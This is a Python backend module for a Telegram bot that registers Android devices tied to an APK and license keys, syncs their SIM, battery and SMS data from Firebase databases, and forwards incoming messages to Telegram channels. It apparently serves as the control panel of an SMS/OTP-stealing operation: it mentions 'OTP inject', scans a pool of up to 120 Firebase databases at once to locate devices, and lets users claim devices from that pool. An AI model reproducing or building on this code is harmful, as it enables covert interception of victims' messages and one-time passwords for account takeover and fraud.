import json
import secrets
from datetime import datetime, timezone

from sqlalchemy import func, or_
from sqlalchemy.orm import Session

from app.database import Device, MonitorProfile, SMSMessage, get_or_create_device
from app.firebase_client import (
    fetch_firebase_device_live,
    fetch_firebase_devices,
    is_device_online,
    normalize_firebase_url,
)


def normalize_phone(number: str) -> str:
    digits = "".join(char for char in number if char.isdigit())
    if len(digits) == 10:
        return f"91{digits}"
    return digits


def display_phone(number: str | None) -> str:
    """Show /mynum without 91 prefix when possible."""
    if not number:
        return "—"
    digits = normalize_phone(number)
    if digits.startswith("91") and len(digits) == 12:
        return digits[2:]
    return digits


def get_monitor_profile(db: Session, telegram_user_id: int) -> MonitorProfile | None:
    return db.query(MonitorProfile).filter(MonitorProfile.telegram_user_id == telegram_user_id).first()


def profile_has_active_key(profile: MonitorProfile | None) -> bool:
    if not profile or not profile.license_key:
        return False
    from app.license_keys import is_valid_license_key_format, license_key_exists

    key = profile.license_key.strip().upper()
    return is_valid_license_key_format(key) and license_key_exists(key)


def require_active_license_key(profile: MonitorProfile | None) -> str:
    if not profile or not profile.license_key:
        raise ValueError(
            "/mynum sirf key users ke liye.\n"
            "Pehle /key generate → APK + bot same key → /a <device_id>"
        )
    return require_license_key(profile)


def ensure_sim_selected(profile: MonitorProfile) -> None:
    if not profile.sim_selected:
        raise ValueError("Select SIM first! Pick SIM after ⚡ fb, /fy or /setdevice.")


def get_or_create_monitor_profile(db: Session, telegram_user_id: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if profile:
        return profile
    profile = MonitorProfile(telegram_user_id=telegram_user_id)
    db.add(profile)
    db.flush()
    return profile


def set_profile_phone(db: Session, telegram_user_id: int, phone_number: str) -> MonitorProfile:
    """Set /mynum on profile only — does not replace active Firebase device."""
    normalized = normalize_phone(phone_number)
    if len(normalized) < 10:
        raise ValueError("Invalid phone number")

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.phone_number = normalized
    profile.mynum_selected = True
    db.commit()
    db.refresh(profile)
    return profile


def ensure_mynum_selected(profile: MonitorProfile) -> None:
    if not profile.phone_number:
        raise ValueError("Pehle /mynum <number> set karo (incoming OTP inject ke liye)")


def set_user_phone(db: Session, telegram_user_id: int, phone_number: str) -> tuple[MonitorProfile, Device]:
    profile = set_profile_phone(db, telegram_user_id, phone_number)
    device = get_active_device(db, telegram_user_id)
    if device:
        return profile, device

    normalized = profile.phone_number or ""
    device_name = f"num-{normalized}"
    device = register_device(db, device_name)
    device.phone_number = normalized
    device.owner_telegram_id = telegram_user_id
    db.commit()
    db.refresh(device)
    return profile, device


def start_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile, Device]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.active_device_id:
        raise ValueError("Pehle /fdy ya /fy <device_id> se device select karo (inject ke liye /a)")
    require_license_key(profile)
    ensure_sim_selected(profile)
    ensure_mynum_selected(profile)

    device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    if not device:
        raise ValueError("Active device nahi mili")

    if not profile.channel_id:
        raise ValueError("Add a channel first!")

    profile.is_monitoring = True
    profile.started_at = datetime.now(timezone.utc)
    db.commit()
    db.refresh(profile)
    db.refresh(device)
    return profile, device


def count_old_sms(db: Session, device_id: int, since: datetime | None = None) -> int:
    query = db.query(SMSMessage).filter(SMSMessage.device_id == device_id)
    if since:
        query = query.filter(SMSMessage.received_at < since)
    return query.count()


def set_channel_id(db: Session, telegram_user_id: int, channel_id: str) -> MonitorProfile:
    normalized = channel_id.strip()
    if not normalized.lstrip("-").isdigit():
        raise ValueError("Valid channel ID daalo, example: -1003553669855")

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.channel_id = normalized
    db.commit()
    db.refresh(profile)
    return profile


def select_sim_slot(db: Session, telegram_user_id: int, sim_index: int) -> MonitorProfile:
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.selected_sim_index = sim_index
    profile.sim_selected = True
    db.commit()
    db.refresh(profile)
    return profile


def resume_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile, Device | None]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Profile nahi mili. Pehle /setfirebase karo")
    ensure_sim_selected(profile)
    if not profile.active_device_id:
        raise ValueError("Pehle /setdevice <id> se device select karo")

    device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    if not profile.channel_id:
        raise ValueError("Add a channel first!")
    profile.is_monitoring = True
    profile.started_at = datetime.now(timezone.utc)
    db.commit()
    db.refresh(profile)
    return profile, device


async def bind_device_to_license_key(
    db: Session,
    profile: MonitorProfile,
    device: Device,
) -> None:
    license_key = (profile.license_key or "").strip().upper()
    if not license_key.startswith("KEY-"):
        return

    from app.license_keys import push_key_config, register_device_on_key

    ok, message = register_device_on_key(license_key, device.name, profile.telegram_user_id)
    if not ok:
        raise ValueError(message)

    device.api_key = license_key
    db.commit()
    db.refresh(device)
    firebase_bases = [profile.firebase_url] if profile.firebase_url else None
    await push_key_config(
        license_key,
        monitoring=False,
        device_id=device.name,
        channel_id=profile.channel_id,
        target_number=profile.phone_number,
        sim_index=profile.selected_sim_index or 0,
        firebase_bases=firebase_bases,
    )


async def set_license_key(
    db: Session,
    telegram_user_id: int,
    key_value: str,
) -> tuple[MonitorProfile, str, str]:
    """Set license key (KEY-XXXX only). Returns (profile, display_key, key_type)."""
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    key_value = key_value.strip()

    if key_value.startswith(("http://", "https://")) or (
        "firebaseio.com" in key_value.lower() or "firebasedatabase.app" in key_value.lower()
    ):
        raise ValueError("use_setfirebase")

    if key_value.upper().startswith("KEY-"):
        from app.license_keys import assert_license_key_registered, push_key_config

        try:
            normalized_key = assert_license_key_registered(key_value)
        except ValueError as exc:
            if str(exc) == "invalid_format":
                raise ValueError("invalid_format") from exc
            raise ValueError("invalid_key") from exc

        profile.license_key = normalized_key
        profile.is_monitoring = False

        device = None
        device_id = ""
        if profile.active_device_id:
            device = db.query(Device).filter(Device.id == profile.active_device_id).first()
            if device:
                device.api_key = normalized_key
                device_id = device.name

        db.commit()
        db.refresh(profile)

        firebase_bases = [profile.firebase_url] if profile.firebase_url else None
        await push_key_config(
            normalized_key,
            monitoring=False,
            device_id=device_id,
            channel_id=profile.channel_id,
            target_number=profile.phone_number,
            sim_index=profile.selected_sim_index or 0,
            firebase_bases=firebase_bases,
        )
        if device:
            await bind_device_to_license_key(db, profile, device)
        return profile, normalized_key, "key"

    raise ValueError("invalid_format")


def set_inject_key(db: Session, telegram_user_id: int, inject_key: str) -> Device:
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    device = None
    if profile.active_device_id:
        device = db.query(Device).filter(Device.id == profile.active_device_id).first()

    if inject_key.upper().startswith("KEY-"):
        from app.license_keys import assert_license_key_registered

        normalized = assert_license_key_registered(inject_key)
        profile.license_key = normalized
        if device:
            device.api_key = normalized
        else:
            raise ValueError("Pehle /setdevice <id> se device select karo")
        db.commit()
        db.refresh(device)
        return device

    raise ValueError("invalid_format")


def stop_monitoring(db: Session, telegram_user_id: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Monitor profile nahi mili")

    device = None
    if profile.active_device_id:
        device = db.query(Device).filter(Device.id == profile.active_device_id).first()

    profile.is_monitoring = False
    if device:
        from app.firebase_sms_sync import clear_sms_baseline

        clear_sms_baseline(device)
    db.commit()
    db.refresh(profile)
    return profile


def get_monitoring_user_ids(db: Session, sms: SMSMessage) -> set[int]:
    targets: set[int] = set()

    active_profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
    for profile in active_profiles:
        if profile.started_at and sms.received_at and sms.received_at < profile.started_at:
            continue
        if not profile.active_device_id:
            continue
        if sms.device_id and sms.device_id == profile.active_device_id:
            targets.add(profile.telegram_user_id)
            continue
        if sms.device_id:
            device = db.query(Device).filter(Device.id == sms.device_id).first()
            if device and device.owner_telegram_id == profile.telegram_user_id:
                targets.add(profile.telegram_user_id)

    return targets


def touch_device(db: Session, device_name: str) -> Device:
    return get_or_create_device(db, device_name)


def register_device(db: Session, name: str, api_key: str | None = None) -> Device:
    existing = db.query(Device).filter(Device.name == name).first()
    if existing:
        if api_key:
            existing.api_key = api_key
        existing.is_active = True
        existing.last_seen = datetime.now(timezone.utc)
        return existing

    device = Device(
        name=name,
        api_key=api_key or secrets.token_urlsafe(24),
        last_seen=datetime.now(timezone.utc),
        is_active=True,
    )
    db.add(device)
    db.flush()
    return device


def save_sms(
    db: Session,
    sender: str,
    message: str,
    device_name: str,
    received_at: datetime | None = None,
    phone_number: str | None = None,
) -> SMSMessage:
    device = touch_device(db, device_name)
    if phone_number:
        device.phone_number = normalize_phone(phone_number)
    sms = SMSMessage(
        sender=sender,
        message=message,
        device_name=device_name,
        device_id=device.id,
        received_at=received_at or datetime.now(timezone.utc),
    )
    db.add(sms)
    db.commit()
    db.refresh(sms)
    return sms


def get_device_by_identifier(db: Session, deviceid: str, exact: bool = False) -> Device | None:
    matches = search_devices(db, deviceid, limit=2 if exact else 1)
    if not matches:
        return None
    if exact and len(matches) > 1:
        return None
    return matches[0]


def search_devices(db: Session, deviceid: str, limit: int = 10) -> list[Device]:
    query = (deviceid or "").strip()
    if not query:
        return []

    if query.isdigit():
        by_id = db.query(Device).filter(Device.id == int(query)).first()
        if by_id:
            return [by_id]

    exact_name = db.query(Device).filter(Device.name == query).all()
    if exact_name:
        return exact_name[:limit]

    exact_key = db.query(Device).filter(Device.firebase_key == query).all()
    if exact_key:
        return exact_key[:limit]

    suffix_matches = (
        db.query(Device)
        .filter(Device.firebase_key.endswith(f"/{query}"))
        .limit(limit)
        .all()
    )
    if suffix_matches:
        return suffix_matches

    filters = [
        Device.name.ilike(f"%{query}%"),
        Device.firebase_key.ilike(f"%{query}%"),
        Device.name.endswith(query),
        Device.firebase_key.endswith(f"/{query}"),
        Device.firebase_key.endswith(query),
    ]
    if len(query) >= 4:
        filters.append(Device.name.startswith(query))
        filters.append(Device.firebase_key.startswith(query))
    partial = (
        db.query(Device)
        .filter(or_(*filters))
        .order_by(Device.last_seen.desc().nullslast(), Device.name)
        .limit(limit)
        .all()
    )
    return partial


def _meta_from_remote(remote: dict, phone_fallback: str | None = None) -> dict:
    raw = remote.get("raw") or {}
    battery = (
        remote.get("battery")
        or remote.get("battery_level")
        or raw.get("battery")
        or raw.get("battery_level")
    )
    sims = remote.get("sims") or []
    meta: dict = {
        "battery": battery,
        "model": remote.get("model") or raw.get("model") or raw.get("device_model") or "Unknown",
        "sims": sims,
        "online": is_device_online(remote),
        "synced_at": datetime.now(timezone.utc).isoformat(),
    }
    if not meta["sims"] and phone_fallback:
        meta["sims"] = [
            {"slot": 1, "index": 0, "carrier": "SIM 1", "number": phone_fallback},
            {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
        ]
    return meta


def apply_remote_to_device(db: Session, device: Device, remote: dict) -> Device:
    if remote.get("phone_number"):
        device.phone_number = normalize_phone(remote["phone_number"])
    device.device_meta = json.dumps(_meta_from_remote(remote, device.phone_number))
    device.last_seen = datetime.now(timezone.utc)
    device.is_active = is_device_online(remote)
    db.commit()
    db.refresh(device)
    return device


async def sync_device_from_firebase(db: Session, device: Device) -> Device:
    import asyncio

    if not device.firebase_source_url:
        return device

    try:
        remote = await asyncio.wait_for(
            fetch_firebase_device_live(
                device.firebase_source_url,
                firebase_key=device.firebase_key,
                device_name=device.name,
                quick_only=True,
                timeout=2.0,
            ),
            timeout=3.0,
        )
    except Exception:
        return device
    if not remote:
        return device

    return apply_remote_to_device(db, device, remote)


def get_all_firebase_urls(db: Session) -> list[str]:
    from app.firebase_client import firebase_root_url
    from app.firebase_pool import get_pool_urls

    seen: set[str] = set()
    roots: list[str] = []
    for raw in (
        row[0]
        for row in db.query(Device.firebase_source_url)
        .filter(Device.firebase_source_url.isnot(None))
        .distinct()
        .all()
        if row[0]
    ):
        root = firebase_root_url(raw)
        if root not in seen:
            seen.add(root)
            roots.append(root)

    for raw in (
        row[0]
        for row in db.query(MonitorProfile.firebase_url)
        .filter(MonitorProfile.firebase_url.isnot(None))
        .distinct()
        .all()
        if row[0]
    ):
        root = firebase_root_url(raw)
        if root not in seen:
            seen.add(root)
            roots.append(root)

    for raw in get_pool_urls(db):
        root = firebase_root_url(raw)
        if root not in seen:
            seen.add(root)
            roots.append(root)

    return sorted(roots)


def _device_matches_query(deviceid: str, remote: dict) -> bool:
    from app.firebase_client import device_id_matches

    query = (deviceid or "").strip()
    if not query:
        return False
    name = str(remote.get("name") or "")
    firebase_key = str(remote.get("firebase_key") or "")
    leaf = firebase_key.split("/")[-1] if firebase_key else ""
    return (
        device_id_matches(query, name)
        or device_id_matches(query, firebase_key)
        or device_id_matches(query, leaf)
    )


async def find_device_in_firebase_url(
    db: Session,
    deviceid: str,
    firebase_url: str,
) -> Device | None:
    import asyncio

    from app.bulk_firebase import upsert_pool_device
    from app.firebase_client import (
        fast_find_device_in_url,
        fetch_firebase_devices,
        firebase_root_url,
    )

    url = firebase_root_url(firebase_url)
    remote = await fast_find_device_in_url(url, deviceid, timeout=2.5)
    if remote and _device_matches_query(deviceid, remote):
        remotes = [remote]
    else:
        try:
            remotes = await asyncio.wait_for(fetch_firebase_devices(url), timeout=6.0)
        except Exception:
            return None
        remotes = [item for item in remotes if _device_matches_query(deviceid, item)]

    if not remotes:
        return None

    remote = remotes[0]
    firebase_key = str(remote.get("firebase_key") or remote.get("name"))
    name = str(remote.get("name") or firebase_key.split("/")[-1])[:128]
    device = upsert_pool_device(
        db,
        device_id=name,
        firebase_url=url,
        firebase_key=firebase_key,
        phone_number=remote.get("phone_number"),
    )
    return apply_remote_to_device(db, device, remote)


async def _store_found_device(
    db: Session,
    url: str,
    remote: dict,
) -> Device:
    from app.bulk_firebase import upsert_pool_device

    firebase_key = str(remote.get("firebase_key") or remote.get("name"))
    name = str(remote.get("name") or firebase_key.split("/")[-1])[:128]
    device = upsert_pool_device(
        db,
        device_id=name,
        firebase_url=url,
        firebase_key=firebase_key,
        phone_number=remote.get("phone_number"),
    )
    return apply_remote_to_device(db, device, remote)


async def find_device_across_all_databases(
    db: Session,
    deviceid: str,
    *,
    prefer_url: str | None = None,
    scan_seconds: float = 30.0,
) -> Device | None:
    from app.firebase_client import fast_find_device_in_url, firebase_root_url

    import asyncio
    import time

    if prefer_url:
        device = await find_device_in_firebase_url(db, deviceid, prefer_url)
        if device:
            return device

    prefer_root = firebase_root_url(prefer_url) if prefer_url else ""
    urls = [url for url in get_all_firebase_urls(db) if url != prefer_root]
    if not urls:
        return None

    semaphore = asyncio.Semaphore(120)
    stop = asyncio.Event()
    found_device: Device | None = None
    db_lock = asyncio.Lock()
    deadline = time.monotonic() + scan_seconds

    async def scan_url(url: str) -> tuple[str, dict] | None:
        if stop.is_set():
            return None
        async with semaphore:
            if stop.is_set():
                return None
            try:
                remote = await fast_find_device_in_url(url, deviceid, timeout=1.2)
            except Exception:
                return None
            if remote and _device_matches_query(deviceid, remote):
                return url, remote
        return None

    async def apply_match(result: tuple[str, dict] | None) -> bool:
        nonlocal found_device
        if not result or stop.is_set():
            return False
        url, remote = result
        async with db_lock:
            if found_device:
                return True
            found_device = await _store_found_device(db, url, remote)
            stop.set()
            db.commit()
            return True

    tasks = {asyncio.create_task(scan_url(url)): url for url in urls}
    try:
        while tasks and not found_device and time.monotonic() < deadline:
            done, _pending = await asyncio.wait(
                tasks.keys(),
                timeout=max(0.05, deadline - time.monotonic()),
                return_when=asyncio.FIRST_COMPLETED,
            )
            for task in done:
                tasks.pop(task, None)
                try:
                    result = task.result()
                except Exception:
                    continue
                if await apply_match(result):
                    break
    finally:
        for task in tasks:
            task.cancel()
        if tasks:
            await asyncio.gather(*tasks.keys(), return_exceptions=True)

    return found_device


async def show_device_by_id(
    db: Session,
    deviceid: str,
    telegram_user_id: int,
    *,
    bind_license_key: bool = False,
) -> tuple[Device, MonitorProfile]:
    import asyncio

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    matches = search_devices(db, deviceid, limit=6)
    if not matches and profile.firebase_url:
        try:
            await asyncio.wait_for(
                connect_firebase_url(db, telegram_user_id, profile.firebase_url),
                timeout=5.0,
            )
        except Exception:
            pass
        matches = search_devices(db, deviceid, limit=6)
    if not matches and profile.firebase_url:
        device = await find_device_in_firebase_url(db, deviceid, profile.firebase_url)
        if device:
            matches = [device]
    if not matches:
        device = await find_device_across_all_databases(
            db,
            deviceid,
            prefer_url=profile.firebase_url,
            scan_seconds=30.0,
        )
        if device:
            matches = [device]
    if not matches:
        db_count = len(get_all_firebase_urls(db))
        raise LookupError(f"notfound:{db_count}")
    if len(matches) > 1:
        raise LookupError(
            "multiple:"
            + "|".join(f"{item.name}:{item.firebase_key or '-'}" for item in matches[:5])
        )
    device = matches[0]

    if device.firebase_source_url:
        device = await sync_device_from_firebase(db, device)
    elif not device.device_meta and device.phone_number:
        device.device_meta = json.dumps(
            _meta_from_remote(
                {"model": "Unknown", "sims": [], "raw": {}},
                device.phone_number,
            )
        )

    if profile.active_device_id != device.id:
        profile.is_monitoring = False
        profile.sim_selected = False
        profile.mynum_selected = False
    profile.active_device_id = device.id
    if device.firebase_source_url and not profile.firebase_url:
        profile.firebase_url = normalize_firebase_url(device.firebase_source_url)
    device.owner_telegram_id = telegram_user_id
    device.is_active = True
    device.last_seen = datetime.now(timezone.utc)
    db.commit()
    db.refresh(device)
    db.refresh(profile)

    if (
        bind_license_key
        and profile.license_key
        and profile.license_key.upper().startswith("KEY-")
    ):
        await bind_device_to_license_key(db, profile, device)

    return device, profile


def require_license_key(profile: MonitorProfile | None) -> str:
    if not profile or not profile.license_key:
        raise ValueError("Pehle /key generate aur /key KEY-XXXX-XXXX-XXXX-XXXX set karo.")
    from app.license_keys import assert_license_key_registered

    try:
        return assert_license_key_registered(profile.license_key)
    except ValueError as exc:
        if str(exc) == "invalid_format":
            raise ValueError("Galat key format. Sirf /key generate wali original key use karo.") from exc
        raise ValueError("Invalid key. Pehle /key generate karo — random key kaam nahi karegi.") from exc


def get_active_device(db: Session, telegram_user_id: int) -> Device | None:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.active_device_id:
        return None
    return db.query(Device).filter(Device.id == profile.active_device_id).first()


def claim_pool_device(db: Session, deviceid: str, owner_telegram_id: int) -> tuple[Device, bool]:
    device = get_device_by_identifier(db, deviceid)
    if not device:
        raise LookupError("Device pool mein nahi mili")

    if device.owner_telegram_id and device.owner_telegram_id != owner_telegram_id:
        raise PermissionError("Device kisi aur user ki hai")

    created = device.owner_telegram_id is None
    device.owner_telegram_id = owner_telegram_id
    device.is_active = True
    device.last_seen = datetime.now(timezone.utc)
    db.commit()
    db.refresh(device)
    return device, created


def claim_device(db: Session, deviceid: str, owner_telegram_id: int) -> tuple[Device, bool]:
    device = get_device_by_identifier(db, deviceid)
    created = False

    if device:
        if device.owner_telegram_id and device.owner_telegram_id != owner_telegram_id:
            raise PermissionError("Device kisi aur user ki hai")
        device.owner_telegram_id = owner_telegram_id
        device.is_active = True
        device.last_seen = datetime.now(timezone.utc)
    else:
        device = register_device(db, deviceid)
        device.firebase_key = deviceid
        device.owner_telegram_id = owner_telegram_id
        created = True

    db.commit()
    db.refresh(device)
    return device, created


def list_devices_with_counts(db: Session, owner_telegram_id: int | None = None) -> list[dict]:
    query = db.query(
        Device,
        func.count(SMSMessage.id).label("sms_count"),
    ).outerjoin(SMSMessage, SMSMessage.device_id == Device.id)

    if owner_telegram_id is not None:
        query = query.filter(Device.owner_telegram_id == owner_telegram_id)

    rows = (
        query.group_by(Device.id)
        .order_by(Device.last_seen.desc().nullslast(), Device.name)
        .all()
    )
    return [
        {
            "device": device,
            "sms_count": sms_count,
        }
        for device, sms_count in rows
    ]


async def connect_firebase_url(
    db: Session,
    telegram_user_id: int,
    firebase_url: str,
) -> tuple[MonitorProfile, int, int, list[str]]:
    from app.bulk_firebase import upsert_pool_device

    normalized_url = normalize_firebase_url(firebase_url)
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.firebase_url = normalized_url

    try:
        remote_devices = await fetch_firebase_devices(normalized_url)
    except ValueError:
        remote_devices = []

    if not remote_devices:
        db.commit()
        db.refresh(profile)
        return profile, 0, 0, []

    online_count = 0
    device_ids: list[str] = []
    for remote in remote_devices:
        firebase_key = str(remote["firebase_key"] or remote["name"])
        device_id = str(remote.get("name") or firebase_key.split("/")[-1])[:128]
        device_ids.append(device_id)
        upsert_pool_device(
            db,
            device_id=device_id,
            firebase_url=normalized_url,
            firebase_key=firebase_key,
            phone_number=remote.get("phone_number"),
        )
        if is_device_online(remote):
            online_count += 1

        device = db.query(Device).filter(Device.name == device_id).first()
        if device:
            apply_remote_to_device(db, device, remote)

    db.commit()
    db.refresh(profile)
    return profile, len(remote_devices), online_count, device_ids


async def set_firebase_url(db: Session, telegram_user_id: int, firebase_url: str) -> tuple[MonitorProfile, list[Device]]:
    profile, _total, _online, _device_ids = await connect_firebase_url(db, telegram_user_id, firebase_url)
    devices = db.query(Device).filter(Device.firebase_source_url == profile.firebase_url).all()
    return profile, devices


async def resync_firebase_devices(db: Session, telegram_user_id: int) -> list[Device]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.firebase_url:
        raise ValueError("Pehle /setfirebase <url> use karo")
    _, devices = await set_firebase_url(db, telegram_user_id, profile.firebase_url)
    return devices


def device_status(device: Device) -> str:
    if device.device_meta:
        try:
            meta = json.loads(device.device_meta)
            if meta.get("online") is True:
                return "online"
            if meta.get("online") is False:
                return "offline"
        except (json.JSONDecodeError, TypeError):
            pass
    if not device.is_active:
        return "inactive"
    if not device.last_seen:
        return "unknown"
    age = datetime.now(timezone.utc) - device.last_seen.astimezone(timezone.utc)
    if age.total_seconds() < 300:
        return "online"
    if age.total_seconds() < 3600:
        return "idle"
    return "offline"
